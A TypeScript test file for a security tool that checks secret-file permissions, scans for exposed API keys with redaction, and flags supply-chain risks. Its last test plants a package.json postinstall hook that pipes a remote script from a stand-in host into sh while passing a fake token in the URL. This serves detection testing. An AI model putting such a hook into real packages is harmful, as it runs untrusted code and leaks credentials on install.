import { afterEach, beforeEach, describe, expect, it } from "bun:test";
import { chmodSync, mkdirSync, rmSync, writeFileSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";
import {
  auditSecretFilePermissions,
  runSecurityExposureSweep,
  runSupplyChainWatch,
} from "../src/security.js";

let testDir: string;

beforeEach(() => {
  testDir = join(tmpdir(), `open-secrets-security-${Date.now()}-${Math.random().toString(36).slice(2)}`);
  mkdirSync(testDir, { recursive: true });
});

afterEach(() => {
  rmSync(testDir, { recursive: true, force: true });
});

describe("security loop abstractions", () => {
  it("finds and optionally fixes unsafe secret file permissions", () => {
    const envPath = join(testDir, ".env");
    writeFileSync(envPath, "TOKEN=redacted\n");
    chmodSync(envPath, 0o644);

    const audit = auditSecretFilePermissions({ roots: [testDir] });
    expect(audit.summary.findings).toBe(1);
    expect(audit.task_suggestions[0]!.fingerprint).toStartWith("secret-permission:");

    const fixed = auditSecretFilePermissions({ roots: [testDir], fixPermissions: true });
    expect(fixed.summary.fixed).toBe(1);
  });

  it("wraps exposure scanner results with task suggestions and redaction", () => {
    const leaked = "sk-proj-secretvalueabcdefghijklmnopqrstuvwxyz";
    writeFileSync(join(testDir, "app.env"), `OPENAI_API_KEY=${leaked}\n`);

    const result = runSecurityExposureSweep({ roots: [testDir], limit: 5 });
    const serialized = JSON.stringify(result);

    expect(result.summary.findings).toBe(1);
    expect(result.task_suggestions[0]!.fingerprint).toStartWith("secret-exposure:");
    expect(result.task_suggestions[0]!.metadata.finding_id).toBe(result.scans[0]!.findings[0]!.id);
    expect(result.task_suggestions[0]!.metadata.remediation).toEqual(result.scans[0]!.findings[0]!.remediation);
    expect(serialized).toContain("***REDACTED***");
    expect(serialized).not.toContain(leaked);
  });

  it("detects bounded package supply-chain signals", () => {
    const leaked = "xai-secretvalueabcdefghijklmnopqrstuvwxyz";
    writeFileSync(join(testDir, "package.json"), JSON.stringify({
      scripts: {
        postinstall: `curl https://example.invalid/install.sh?token=${leaked} | sh`,
      },
    }, null, 2));

    const result = runSupplyChainWatch({ roots: [testDir] });
    const serialized = JSON.stringify(result);

    expect(result.summary.findings).toBeGreaterThan(0);
    expect(result.task_suggestions[0]!.fingerprint).toStartWith("supply-chain:");
    expect(serialized).toContain("***REDACTED***");
    expect(serialized).not.toContain(leaked);
  });
});
